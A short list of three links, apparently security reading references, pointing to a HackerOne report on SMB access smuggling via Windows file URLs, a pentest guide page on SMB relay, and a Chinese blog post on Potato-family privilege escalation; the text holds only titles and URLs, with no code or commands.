[SMB access smuggling via FILE URL on Windows](https://hackerone.com/reports/726117)

[SMB Relay](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/smb-relay)

[Potato 家族提权学习](http://moonflower.fun/index.php/2022/05/01/329/)
